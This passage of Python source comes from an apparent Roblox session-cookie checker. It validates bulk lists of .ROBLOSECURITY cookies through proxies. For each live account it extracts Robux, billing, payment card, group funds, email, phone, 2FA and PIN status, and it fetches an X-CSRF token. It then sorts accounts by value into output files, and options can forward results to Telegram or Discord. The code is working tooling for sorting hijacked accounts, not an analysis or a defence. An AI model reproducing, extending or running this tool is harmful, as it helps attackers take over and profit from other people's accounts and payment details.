    if groupsIds:
        for groupId in groupsIds:
            response: dict = await sendGetRequestRoblox(f'https://apis.roblox.com/transaction-records/v1/groups/{groupId}/revenue/summary/year', cookies=cookies, proxies=proxies)
            groupsPending += response['pendingRobux']
            
    color = ANSI.FG.GREEN if groupsPending else ANSI.FG.RED
    return {
        'Groups Pending': {
            'color': f'{ANSI.FG.CYAN}G. Pending:{color} {groupsPending}{ANSI.FG.WHITE}',
            'no-color': f'G. Pending: {groupsPending}',
            'sort-int': groupsPending
        }
    }

async def getGroupsFundsRoblox(groupsIds: list[str], cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Groups_Funds']:
        return {'Groups Funds': None}
    groupsFunds = 0
    if groupsIds:
        for groupId in groupsIds:
            response: dict = await sendGetRequestRoblox(f'https://economy.roblox.com/v1/groups/{groupId}/currency', cookies=cookies, proxies=proxies)
            groupsFunds += response['robux']
            
    color = ANSI.FG.GREEN if groupsFunds else ANSI.FG.RED
    return {
        'Groups Funds': {
            'color': f'{ANSI.FG.CYAN}G. Funds:{color} {groupsFunds}{ANSI.FG.WHITE}',
            'no-color': f'G. Funds: {groupsFunds}',
            'sort-int': groupsFunds
        }
    }

async def getPlaceVisitsRoblox(data: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Place_Visits']:
        return {'Place Visits': None}
    placeVisits = data['components']['Statistics']['numberOfVisits']
    color = ANSI.FG.GREEN if placeVisits else ANSI.FG.RED
    return {
        'Place Visits': {
            'color': f'{ANSI.FG.CYAN}Place Visits:{color} {placeVisits}{ANSI.FG.WHITE}',
            'no-color': f'Place Visits: {placeVisits}',
            'sort-int': placeVisits
        }
    }

def convertAgeGroupRoblox(text: str) -> str:
    match = AGE_GROUP_PATTERN.search(text)
    if not match:
        logger.warning(f'< [CONVERT_AGE_GROUP_ROBLOX] > Can\'t convert age: {text}', force=True)
        return 'UNK'
    
    direction, ageFrom, ageTo = match.groups()
    return f'{ageFrom}{f'-{ageTo}' if ageTo else ''}{AGE_GROUP_MAPPING.get(str(direction).lower(), '')}'

async def getAgeGroupRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Age_Group']:
        return {'Age Group': None}
    response: dict = await sendGetRequestRoblox('https://apis.roblox.com/user-settings-api/v1/account-insights/age-group', cookies=cookies, proxies=proxies)
    ageGroup = convertAgeGroupRoblox(response['ageGroupTranslationKey'])
    isChecked = ' (Checked)' if response['isChecked'] else ''
    return {
        'Age Group': {
            'color': f'{ANSI.FG.CYAN}Age Group:{ANSI.FG.WHITE} {ageGroup}{isChecked}',
            'no-color': f'Age Group: {ageGroup}{isChecked}',
            'sort-str': f'{ageGroup}{isChecked}'
        }
    }

async def getVerifiedAgeRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Verified_Age']:
        return {'Verified Age': None}
    response: dict = await sendGetRequestRoblox('https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age', cookies=cookies, proxies=proxies)
    isVerifiedAge = 'Yes' if response['isVerified'] else 'No'
    return {
        'Verified Age': {
            'color': f'{ANSI.FG.CYAN}Verified Age:{ANSI.FG.WHITE} {isVerifiedAge}',
            'no-color': f'Verified Age: {isVerifiedAge}',
            'sort-str': isVerifiedAge
        }
    }

async def getVerifiedVoiceRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Verified_Voice']:
        return {'Verified Voice': None}
    response: dict = await sendGetRequestRoblox('https://voice.roblox.com/v1/settings', cookies=cookies, proxies=proxies)
    isVerifiedVoice = 'Yes' if response['isVerifiedForVoice'] else 'No'
    return {
        'Verified Voice': {
        'color': f'{ANSI.FG.CYAN}Voice:{ANSI.FG.WHITE} {isVerifiedVoice}',
        'no-color': f'Voice: {isVerifiedVoice}',
        'sort-str': isVerifiedVoice
        }
    }

async def getFriendsRoblox(data: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Friends']:
        return {'Friends': None}
    friends = data['components']['UserProfileHeader']['counts']['friendsCount']
    return {
        'Friends': {
            'color': f'{ANSI.FG.CYAN}Friends:{ANSI.FG.WHITE} {friends}',
            'no-color': f'Friends: {friends}',
            'sort-int': friends
        }
    }

async def getFollowersRoblox(data: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Followers']:
        return {'Followers': None}
    followers = data['components']['UserProfileHeader']['counts']['followersCount']
    return {
        'Followers': {
            'color': f'{ANSI.FG.CYAN}Followers:{ANSI.FG.WHITE} {followers}',
            'no-color': f'Followers: {followers}',
            'sort-int': followers
        }
    }

async def getFollowingsRoblox(data: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Followings']:
        return {'Followings': None}
    followings = data['components']['UserProfileHeader']['counts']['followingsCount']
    return {
        'Followings': {
            'color': f'{ANSI.FG.CYAN}Followings:{ANSI.FG.WHITE} {followings}',
            'no-color': f'Followings: {followings}',
            'sort-int': followings
        }
    }

async def getRobloxBadgesRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'Names') -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Roblox_Badges']:
        return {'Roblox Badges': None}
    response = await sendGetRequestRoblox(f'https://accountinformation.roblox.com/v1/users/{userId}/roblox-badges', cookies=cookies, proxies=proxies)
    robloxBadges = [badge['name'] for badge in response]
    value = formatNNOutput(robloxBadges, mode=outputMode) if robloxBadges else '0'
    return {
        'Roblox Badges': {
            'color': f'{ANSI.FG.CYAN}Roblox Badges:{ANSI.FG.WHITE} {value}',
            'no-color': f'Roblox Badges: {value}',
            'sort-int': len(robloxBadges),
            'sort-list': robloxBadges
        }
    }

async def getXCSRFTokenRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['X_CSRF_Token']:
        return {'X-CSRF-Token': None}
    response: ClientResponse = await sendPostRequestRoblox('https://auth.roblox.com/v2/logout', cookies=cookies, proxies=proxies)
    XCSRFToken = response.headers['X-CSRF-Token']
    return {
        'X-CSRF-Token': {
            'color': f'{ANSI.FG.CYAN}X-CSRF-Token:{ANSI.FG.WHITE} {XCSRFToken}',
            'no-color': f'X-CSRF-Token: {XCSRFToken}'
        }
    }

### Функции обработки некоторых данных

def formatNNPPOutput(data: dict[str, list[str]], *, mode: str = 'PlaceNames') -> int | str:
    '''Modes (NNPP): Number, Names, PlaceNumber, PlaceNames'''
    match mode:
        case 'Number':
            return sum(len(names) for names in data.values() if names)
        case 'Names':
            return ', '.join(itertools.chain.from_iterable(data.values()))
        case 'PlaceNumber':
            return ', '.join(f'{placeName} ({len(names)})' for placeName, names in data.items() if names)
        case _: # PlaceNames
            return ', '.join(f'{placeName} ({', '.join(names)})' for placeName, names in data.items() if names)

def formatNNOutput(data: list[str], *, mode: str = 'Names') -> int | str:
    '''Modes (NN): Number, Names'''
    match mode:
        case 'Number':
            return len(data)
        case _: # Names
            return ', '.join(data)

def formatCustomGamepassesOutput(data: dict[str, int], *, mode: str = 'NameNumber') -> int | str:
    '''Modes: Number, NameNumber'''
    match mode:
        case 'Number':
            return sum(data.values())
        case _: # NameNumber
            return ', '.join(f'{name} ({amount})' for name, amount in data.items() if amount)

### Функции сортировки данных

async def sortFromIntDataRoblox(locker: str, path: Path, allDataString: str, values: list[int], data: int) -> None:
    if not values:
        return

    for value in values:
        if not (value <= data):
            continue

        async with locker:
            async with aiofiles.open(path / f'{value}+.txt', 'a', encoding='utf-8') as file:
                await file.write(allDataString)

async def sortFromToIntDataRoblox(locker: str, path: Path, allDataString: str, values: list[list[int]], data: int) -> None:
    if not values:
        return

    for value in values:
        if not (value[0] <= data <= value[1]):
            continue

        async with locker:
            async with aiofiles.open(path / f'{value[0]}-{value[1]}.txt', 'a', encoding='utf-8') as file:
                await file.write(allDataString)

async def sortStrDataRoblox(locker: str, path: Path, allDataString: str, data: str) -> None:
    async with locker:
        async with aiofiles.open(path / f'{data}.txt', 'a', encoding='utf-8') as file:
            await file.write(allDataString)

async def sortDictNamesDataRoblox(locker: str, path: Path, allDataString: str, data: dict[str, list[str]]) -> None:
    if not any(data.values()):
        return

    namesPath = path / 'Names'
    for placeName, listOfItems in data.items():
        if not listOfItems:
            continue

        placePath = namesPath / placeName
        placePath.mkdir(parents=True, exist_ok=True)
        for name in listOfItems:
            async with locker:
                async with aiofiles.open(placePath / f'{name}.txt', 'a', encoding='utf-8') as file:
                    await file.write(allDataString)

    async with locker:
        async with aiofiles.open(namesPath / '.All.txt', 'a', encoding='utf-8') as file:
            await file.write(allDataString)

async def sortDictPlacesDataRoblox(locker: str, path: Path, allDataString: str, data: dict[str, list[str]]) -> None:
    if not any(data.values()):
        return

    placesPath = path / 'Places'
    placesPath.mkdir(parents=True, exist_ok=True)
    for placeName, listOfItems in data.items():
        if not listOfItems:
            continue

        async with locker:
            async with aiofiles.open(placesPath / f'{placeName}.txt', 'a', encoding='utf-8') as file:
                await file.write(allDataString)

    async with locker:
        async with aiofiles.open(placesPath / '.All.txt', 'a', encoding='utf-8') as file:
            await file.write(allDataString)

async def sortListNamesDataRoblox(isSort: bool, locker: str, path: Path, allDataString: str, data: list[str]) -> None:
    if not isSort:
        return

    namesPath = path / 'Names'
    namesPath.mkdir(parents=True, exist_ok=True)
    for name in data:
        async with locker:
            async with aiofiles.open(namesPath / f'{name}.txt', 'a', encoding='utf-8') as file:
                await file.write(allDataString)

async def sortingDataRoblox(locker: asyncio.Lock, path: Path, category: str, sortOptions: dict, allDataString: str, simpleData: int | str, complexData: dict[str, list[str]] | list[str] = None) -> None:
    if simpleData == 0:
        if sortOptions[category]['zero']:
            path.mkdir(parents=True, exist_ok=True)
            async with locker:
                async with aiofiles.open(path / '0.txt', 'a', encoding='utf-8') as file:
                    await file.write(allDataString)
        return
    elif simpleData == 'No':
        return
    else:
        path.mkdir(parents=True, exist_ok=True)

    dataType = type(simpleData) if complexData is None else type(complexData)
    if dataType is int:
        await asyncio.gather(
            sortFromIntDataRoblox(locker, path, allDataString, sortOptions[category]['from'], simpleData),
            sortFromToIntDataRoblox(locker, path, allDataString, sortOptions[category]['fromTo'], simpleData)
        )
    elif dataType is str:
        await sortStrDataRoblox(locker, path, allDataString, simpleData)
    elif dataType is dict:
        await asyncio.gather(
            sortFromIntDataRoblox(locker, path, allDataString, sortOptions[category]['from'], simpleData),
            sortFromToIntDataRoblox(locker, path, allDataString, sortOptions[category]['fromTo'], simpleData),
            sortDictNamesDataRoblox(locker, path, allDataString, complexData),
            sortDictPlacesDataRoblox(locker, path, allDataString, complexData)
        )
    elif dataType is list:
        await asyncio.gather(
            sortFromIntDataRoblox(locker, path, allDataString, sortOptions[category]['from'], simpleData),
            sortFromToIntDataRoblox(locker, path, allDataString, sortOptions[category]['fromTo'], simpleData),
            sortListNamesDataRoblox(sortOptions[category]['names'], locker, path, allDataString, complexData)
        )

async def robloxCookieValidChecker(category: str, cookies: set[str], proxies: Optional[list[str]] = None) -> list[str]:
    if not config['Roblox'][category]['General']['First_Check_All_Cookies_For_Valid']:
        return list(cookies)

    amountOfCookies = len(cookies)
    counters = {
        'valid'   : 0,
        'invalid' : 0,
        'banned'  : 0
    }
    cmdWriter(f'\r [{ANSI.FG.CYAN}>{ANSI.FG.WHITE}] {MT_First_We_Check_For_Valid}: {ANSI.FG.GREEN}{MT_Valid}{ANSI.FG.WHITE}: 0, {ANSI.FG.RED}{MT_Invalid}{ANSI.FG.WHITE}: 0, {ANSI.FG.YELLOW}{MT_Banned[1]}{ANSI.FG.WHITE}: 0 | {ANSI.FG.CYAN}{MT_Total.capitalize()}{ANSI.FG.WHITE}: 0 {MT_Of} {amountOfCookies}')

    semaphore = asyncio.Semaphore(int(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker']) if str(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox'][category]['General']['Number_Of_Threads_For_Valid_Checker']) <= 1000) else 50)

    async def threadingCheckValid(cookie: str):
        async with semaphore:
            try:
                await sendGetRequestRoblox('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie}, proxies=proxies)
                counters['valid'] += 1
            except InvalidCookie:
                cookies.remove(cookie)
                counters['invalid'] += 1
            except AccountBanned:
                cookies.remove(cookie)
                counters['banned'] += 1
            finally:
                cmdWriter(f'\r [{ANSI.FG.CYAN}>{ANSI.FG.WHITE}] {MT_First_We_Check_For_Valid}: {ANSI.FG.GREEN}{MT_Valid}{ANSI.FG.WHITE}: {counters['valid']}, {ANSI.FG.RED}{MT_Invalid}{ANSI.FG.WHITE}: {counters['invalid']}, {ANSI.FG.YELLOW}{MT_Banned[1]}{ANSI.FG.WHITE}: {counters['banned']} | {ANSI.FG.CYAN}{MT_Total.capitalize()}{ANSI.FG.WHITE}: {counters['valid'] + counters['invalid'] + counters['banned']} {MT_Of} {amountOfCookies}')

    await asyncio.gather(
        *(threadingCheckValid(cookie) for cookie in cookies)
    )

    if not cookies:
        return errorOrCorrectHandler(True, MT_All_Cookies_Were_Invalid, generateVisualPath(MT_Roblox, MT_Cookie_Checker if category == 'CookieChecker' else MT_Transaction_Analysis))

    removeLines(1)
    cmdWriter('\n')
    return list(cookies)

async def dataFromCookieRoblox(order: list[str], checkedAccounts: set[int], cookies: dict[str, str], proxies: Optional[list[str]] = None, outputModes: dict[str, str] = None) -> dict[str, dict]:
    accountInformation = await getAccountInformationRoblox(cookies, proxies)
    userId = accountInformation['UserId']
    if userId in checkedAccounts:
        return userId
    checkedAccounts.add(userId)

    responseAllDataList: list[dict] = await asyncio.gather(
        getMixedInformationRoblox(userId, cookies, proxies),
        getLinkRoblox(userId),
        getNameRoblox(accountInformation),
        getDisplayNameRoblox(accountInformation),
        getRegistrationDateRoblox(accountInformation, userId, cookies, proxies),
        getCountryRegistrationRoblox(cookies, proxies),
        getRobuxRoblox(userId, cookies, proxies),
        getBillingRoblox(cookies, proxies),
        getTransactionsForYearRoblox( userId, cookies, proxies),
        getDonateAllTimeRoblox(userId, cookies, proxies, outputModes['Custom_Gamepasses']),
        getRapRoblox(userId, cookies, proxies),
        getCardRoblox(cookies, proxies),
        getPremiumRoblox(accountInformation),
        getGamepassesRoblox(userId, cookies, proxies, outputModes['Gamepasses']),
        getBadgesRoblox(userId, cookies, proxies, outputModes['Badges']),
        getFavoritePlacesRoblox(userId, cookies, proxies, outputModes['Favorite_Places']),
        getPlacesWeeklyPlaytimeRoblox(cookies, proxies, outputModes['Places_Weekly_Playtime']),
        getBundlesRoblox(userId, cookies, proxies, outputModes['Bundles']),
        getInventoryPrivacyRoblox(cookies, proxies),
        getTradePrivacyRoblox(cookies, proxies),
        getCanTradeRoblox(accountInformation),
        getSessionsRoblox(cookies, proxies),
        getEmailRoblox(accountInformation),
        getPhoneRoblox(cookies, proxies),
        get2FARoblox(accountInformation),
        getPinRoblox(accountInformation),
        getGroupsInformationRoblox(userId, cookies, proxies, outputModes['Groups_Owned']),
        getAgeGroupRoblox(cookies, proxies),
        getVerifiedAgeRoblox(cookies, proxies),
        getVerifiedVoiceRoblox(cookies, proxies),
        getRobloxBadgesRoblox(userId, cookies, proxies, outputModes['Roblox_Badges']),
        getXCSRFTokenRoblox(cookies, proxies)
    )

    responseAllDataTimedDict = {
        'ID': {
            'color': f'{ANSI.FG.CYAN}ID:{ANSI.FG.WHITE} {userId}',
            'no-color': f'ID: {userId}',
            'sort-str': str(userId)
        }
    } if config['Roblox']['CookieChecker']['Main']['ID'] else {'ID': None}

    for value in responseAllDataList:
        responseAllDataTimedDict.update(value)

    responseAllDataDict = {}
    for key in order:
        if responseAllDataTimedDict[key]:
            responseAllDataDict[key] = responseAllDataTimedDict[key]

    return responseAllDataDict

async def robloxCookieChecker(file: str) -> None:
    labelASCII()
    cmdWriter(f' {generateVisualPath(MT_Roblox, MT_Cookie_Checker)}\n\n [{ANSI.FG.CYAN}~{ANSI.FG.WHITE}] {MT_Wait[0]}...')

    if not [data[1] for data in cookieData.listOfCookieData if config['Roblox']['CookieChecker']['Main'][data[1]]]:
        return errorOrCorrectHandler(True, MT_Enable_Something_In, generateVisualPath(MT_Roblox, MT_Cookie_Checker))

    isUseProxy = config['Roblox']['General']['Proxy']['Use_Proxy']
    proxiesFromFile = getProxiesFromFileRoblox(isUseProxy, Path('Roblox', 'proxies.txt'), generateVisualPath(MT_Roblox, MT_Cookie_Checker))
    if isUseProxy and not proxiesFromFile:
        return

    cookiesFromFile = getCookiesFromFileRoblox(Path('Roblox', 'Cookie Checker', file), generateVisualPath(MT_Roblox, MT_Cookie_Checker))
    if not cookiesFromFile:
        return

    checkReadyCookies = await robloxCookieValidChecker('CookieChecker', cookiesFromFile, proxiesFromFile)
    if not checkReadyCookies:
        return

    counters = {
        'cookie'     : 0,
        'valid'      : 0,
        'invalid'    : 0,
        'banned'     : 0,
        'duplicates' : 0
    }

    amountOfCookiesFromFile       = len(checkReadyCookies)
    amountOfCookiesFromFileStrLen = len(str(amountOfCookiesFromFile))

    isOutputTotal                 = config['Outputs']['Output_Total']
    isSendResultsToTelegramBot    = config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot']
    isSendResultsToDiscordWebhook = config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook']

    percentCategoriesList = ['Robux', 'Billing', 'Pending', 'Donate (1 Year)', 'Donate (All Time)', 'Rap', 'Card', 'Groups Owned', 'Groups Members', 'Groups Pending', 'Groups Funds', 'Place Visits']
    outputTotalCategoriesList = percentCategoriesList + ['Premium', 'Gamepasses', 'Custom Gamepasses', 'Badges', 'Favorite Places', 'Bundles']

    if isOutputTotal or isSendResultsToTelegramBot or isSendResultsToDiscordWebhook:
        totalDataCurrent = {}
        for key in outputTotalCategoriesList:
            mainValue, percentValue = [0, f'{ANSI.FG.GRAY}| 0 | 0.0% |'] if config['Roblox']['CookieChecker']['Main']['_'.join(re.sub(r'[()]', '', key).split())] else [f'{ANSI.FG.GRAY}Off', '']
            totalDataCurrent[key] = mainValue
            if key in percentCategoriesList:
                totalDataCurrent[f'{key} %'] = percentValue
                counters[key] = totalDataCurrent[key]

        bundlesIds = [id[0] for id in config['Roblox']['CookieChecker']['Main']['Bundles_List'] if id[2]]
        for bundle in [[192, 'Korblox'], [201, 'Headless']]:
            totalDataCurrent[bundle[1]] = f'{ANSI.FG.GRAY}Off{ANSI.FG.WHITE}' if not (config['Roblox']['CookieChecker']['Main']['Bundles'] and bundle[0] in bundlesIds) else 0            

        lowerTotalOutputLines = '_' * (48 + amountOfCookiesFromFileStrLen)
        upperTotalOutputLines = '‾' * (48 + amountOfCookiesFromFileStrLen)
        def printTotalOutputRCC() -> None:
            cmdWriter(rf'''
   {ANSI.FG.GRAY}{lowerTotalOutputLines}
  {ANSI.FG.GRAY}/  | {                                        ANSI.FG.CYAN}Cookie{           ANSI.FG.WHITE}: {counters['cookie']} {MT_Of} {amountOfCookiesFromFile}
 {ANSI.FG.GRAY}/   | {                                        ANSI.FG.GREEN}Valid{           ANSI.FG.WHITE}: {counters['valid']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.YELLOW}Duplicate{      ANSI.FG.WHITE}: {counters['duplicates']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.RED}Invalid{           ANSI.FG.WHITE}: {counters['invalid']}
 {ANSI.FG.GRAY}|   | {                            ANSI.CLEAR}{ANSI.FG.YELLOW}Ban{            ANSI.CLEAR}{ANSI.DECOR.BOLD}: {counters['banned']:<24}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Robux{            ANSI.FG.WHITE}: {totalDataCurrent['Robux']:<22} {            totalDataCurrent['Robux %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Billing{          ANSI.FG.WHITE}: {totalDataCurrent['Billing']:<20} {          totalDataCurrent['Billing %']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[0]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN}Pending{          ANSI.FG.WHITE}: {totalDataCurrent['Pending']:<20} {          totalDataCurrent['Pending %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Donate (1 Year){  ANSI.FG.WHITE}: {totalDataCurrent['Donate (1 Year)']:<12} {  totalDataCurrent['Donate (1 Year) %']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[1]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN}Donate (All Time){ANSI.FG.WHITE}: {totalDataCurrent['Donate (All Time)']:<10} {totalDataCurrent['Donate (All Time) %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Rap{              ANSI.FG.WHITE}: {totalDataCurrent['Rap']:<24} {              totalDataCurrent['Rap %']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[2]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN}Card{             ANSI.FG.WHITE}: {totalDataCurrent['Card']:<23} {             totalDataCurrent['Card %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Premium{          ANSI.FG.WHITE}: {totalDataCurrent['Premium']:<20}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[3]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN}Gamepasses{       ANSI.FG.WHITE}: {totalDataCurrent['Gamepasses']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Custom Gamepasses{ANSI.FG.WHITE}: {totalDataCurrent['Custom Gamepasses']}
 {ANSI.FG.GRAY}| {ANSI.FG.PINK}{MT_Total[4]}{ANSI.FG.GRAY} | {ANSI.FG.CYAN}Badges{           ANSI.FG.WHITE}: {totalDataCurrent['Badges']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Favorite Places{  ANSI.FG.WHITE}: {totalDataCurrent['Favorite Places']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Bundles{          ANSI.FG.WHITE}: {totalDataCurrent['Bundles']} {ANSI.FG.WHITE}({ANSI.FG.CYAN}KB{ANSI.FG.WHITE}: {totalDataCurrent['Korblox']}, {ANSI.FG.CYAN}HL{ANSI.FG.WHITE}: {totalDataCurrent['Headless']})
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Groups Owned{     ANSI.FG.WHITE}: {totalDataCurrent['Groups Owned']:<15} {     totalDataCurrent['Groups Owned %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Groups Members{   ANSI.FG.WHITE}: {totalDataCurrent['Groups Members']:<13} {   totalDataCurrent['Groups Members %']}
 {ANSI.FG.GRAY}|   | {                                        ANSI.FG.CYAN}Groups Pending{   ANSI.FG.WHITE}: {totalDataCurrent['Groups Pending']:<13} {   totalDataCurrent['Groups Pending %']}
 {ANSI.FG.GRAY}\   | {                                        ANSI.FG.CYAN}Groups Funds{     ANSI.FG.WHITE}: {totalDataCurrent['Groups Funds']:<15} {     totalDataCurrent['Groups Funds %']}
  {ANSI.FG.GRAY}\  | {                                        ANSI.FG.CYAN}Place Visits{     ANSI.FG.WHITE}: {totalDataCurrent['Place Visits']:<15} {     totalDataCurrent['Place Visits %']}
   {ANSI.FG.GRAY}{upperTotalOutputLines}{ANSI.FG.WHITE}
'''.lstrip('\n'))

    createGlobalCheckListGamepassesRCC()
    createGlobalCheckListBadgesRCC()
    createGlobalCheckListCustomGamepassesRCC()
    createGlobalCheckListFavoritePlacesRCC()
    createGlobalCheckListPlacesWeeklyPlaytime()
    createGlobalCheckListBundlesRCC()

    outputModes = {}
    for category in ['Gamepasses', 'Custom_Gamepasses', 'Badges', 'Favorite_Places', 'Places_Weekly_Playtime', 'Bundles', 'Groups_Owned', 'Roblox_Badges']:
        outputModes[category] = str(config['Roblox']['CookieChecker']['Main'][f'{category}_Output_Mode'])

    if config['Roblox']['CookieChecker']['Sorting']['Sort']:
        sortLock = asyncio.Lock()
        sortOptions = {}
        for category in ['ID', 'Name', 'Display_Name', 'Registration_Date_DMY', 'Registration_Date_In_Days', 'Country_Registration', 'Robux', 'Billing', 'Pending', 'Donate_1_Year', 'Donate_All_Time', 'Rap', 'Card', 'Premium', 'Gamepasses', 'Custom_Gamepasses', 'Badges', 'Favorite_Places', 'Places_Weekly_Playtime', 'Bundles', 'Inventory_Privacy', 'Trade_Privacy', 'Can_Trade', 'Sessions', 'Email', 'Phone', '2FA', 'Pin', 'Groups_Owned', 'Groups_Members', 'Groups_Pending', 'Groups_Funds', 'Place_Visits', 'Age_Group', 'Verified_Age', 'Verified_Voice', 'Friends', 'Followers', 'Followings', 'Roblox_Badges']:
            if not config['Roblox']['CookieChecker']['Main'][category]:
                sortOptions[category] = {'sort': False}
                continue

            dataSortCategory = config['Roblox']['CookieChecker']['Sorting'][category]
            if type(dataSortCategory) is bool:
                sortOptions[category] = {'sort': dataSortCategory}
            elif type(dataSortCategory) is Array:
                if not dataSortCategory[0]:
                    sortOptions[category] = {'sort': False}
                    continue

                sortZero = dataSortCategory[1]
                sortValuesFrom   = getSortValuesFrom(category,   checkSortIsEnabled=True, getOnlyEnabledValues=True)
                sortValuesFromTo = getSortValuesFromTo(category, checkSortIsEnabled=True, getOnlyEnabledValues=True)
                sortNames  = config['Roblox']['CookieChecker']['Sorting'][f'{category}_Names']  if f'{category}_Names'  in config['Roblox']['CookieChecker']['Sorting'] else None
                sortPlaces = config['Roblox']['CookieChecker']['Sorting'][f'{category}_Places'] if f'{category}_Places' in config['Roblox']['CookieChecker']['Sorting'] else None
                if (sortZero or sortValuesFrom or sortValuesFromTo or sortNames or sortPlaces):
                    sortOptions[category] = {
                        'sort': True,
                        'zero': sortZero,
                        'from': sortValuesFrom,
                        'fromTo': sortValuesFromTo,
                        'names': sortNames,
                        'places': sortPlaces
                    }
                else:
                    sortOptions[category] = {'sort': False}

        for id, name in {'192': 'Korblox', '201': 'Headless'}.items():
            sortOptions[name] = {'sort': True if (sortOptions['Bundles']['sort'] and id in checkListBundles) else False}

        logger.debug(f'< [sortOptions] > Generated: {sortOptions}')

    categoriesNames = {
        'ID'                        : 'ID',
        'Name'                      : 'Name',
        'Display_Name'              : 'Display Name',
        'Registration_Date_DMY'     : 'Registration Date (D.M.Y)',
        'Registration_Date_In_Days' : 'Registration Date (In Days)',
        'Country_Registration'      : 'Country Registration',
        'Robux'                     : 'Robux',
        'Billing'                   : 'Billing',
        'Pending'                   : 'Pending',
        'Donate_1_Year'             : 'Donate (1 Year)',
        'Donate_All_Time'           : 'Donate (All Time)',
        'Rap'                       : 'Rap',
        'Card'                      : 'Card',
        'Premium'                   : 'Premium',
        'Gamepasses'                : 'Gamepasses',
        'Custom_Gamepasses'         : 'Custom Gamepasses',
        'Badges'                    : 'Badges',
        'Favorite_Places'           : 'Favorite Places',
        'Places_Weekly_Playtime'    : 'Places Weekly Playtime',
        'Bundles'                   : 'Bundles',
        'Korblox'                   : 'Korblox',
        'Headless'                  : 'Headless',
        'Inventory_Privacy'         : 'Inventory Privacy',
        'Trade_Privacy'             : 'Trade Privacy',
        'Can_Trade'                 : 'Can Trade',
        'Sessions'                  : 'Sessions',
        'Email'                     : 'Email',
        'Phone'                     : 'Phone',
        '2FA'                       : '2FA',
        'Pin'                       : 'Pin',
        'Groups_Owned'              : 'Groups Owned',
        'Groups_Members'            : 'Groups Members',
        'Groups_Pending'            : 'Groups Pending',
        'Groups_Funds'              : 'Groups Funds',
        'Place_Visits'              : 'Place Visits',
        'Age_Group'                 : 'Age Group',
        'Verified_Age'              : 'Verified Age',
        'Verified_Voice'            : 'Verified Voice',
        'Friends'                   : 'Friends',
        'Followers'                 : 'Followers',
        'Followings'                : 'Followings',
        'Roblox_Badges'             : 'Roblox Badges'
    }

    outputFilename = str(config['Roblox']['CookieChecker']['General']['Output_Filename']).strip()
    if config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] and file.lower() not in ('invalid', 'banned', 'duplicates'):
        filename = file
    elif outputFilename.lower() not in ('invalid', 'banned', 'duplicates') and not any(char in outputFilename for char in FILENAME_SPECIAL_CHARS) and len(outputFilename) <= 50:
        filename = f'{outputFilename}.txt'
    else:
        filename = 'output'

    checkedAccounts = set()
    validLock  = asyncio.Lock()
    exceptLock = asyncio.Lock()
    moveCookieNextLine = '\n' if config['Roblox']['CookieChecker']['General']['Move_Cookie_To_The_Next_Line'] else ' | '
    dateOfCheck = currentDate('%d.%m.%Y - %H.%M.%S')
    savePath = Path('Roblox', 'Cookie Checker', 'outputs', dateOfCheck)
    semaphore = asyncio.Semaphore(int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']) if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']).isdigit() and (0 < int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker']) <= 500) else 50)

    def consoleOutputHandlerRCC(message: str) -> None:
        if isOutputTotal and counters['cookie']:
            removeLines(25)
        counters['cookie'] += 1
        cmdWriter(message)
        if isOutputTotal:
            printTotalOutputRCC()
            
